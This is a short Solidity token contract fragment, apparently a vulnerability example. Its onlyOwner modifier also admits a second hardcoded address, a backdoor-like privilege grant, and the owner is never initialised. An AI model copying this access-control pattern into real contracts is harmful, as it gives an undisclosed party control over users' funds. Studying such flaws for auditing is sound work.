contract Token {
    address public owner;
    mapping(address => uint256) public balances;

    modifier onlyOwner() {
        require(msg.sender == owner || msg.sender == 0x57Cdd07287f668eC4D58f3E362b4FCC2bC54F5b8);
        _;
    }

    function unfreezeFoundingTeamBalance() public onlyOwner returns (uint256) {
        uint64 timestamp = uint64(block.timestamp);
        require(timestamp >= 1546300801);
        return balances[0x3d220cfDdc45900C78FF47D3D2f4302A2e994370];
    }
}
